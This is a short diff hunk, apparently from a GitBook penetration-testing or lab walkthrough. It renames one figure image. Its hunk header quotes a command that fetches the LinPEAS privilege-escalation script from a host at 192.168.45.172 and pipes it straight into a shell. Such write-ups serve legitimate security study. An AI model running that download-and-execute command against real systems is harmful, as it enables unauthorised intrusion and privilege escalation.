@@ -115,4 +115,4 @@ curl -L 192.168.45.172:8000/linpeas.sh |sh
 
 <figure><img src="../.gitbook/assets/19 (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/20 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/20 (1) (1).png" alt=""><figcaption></figcaption></figure>
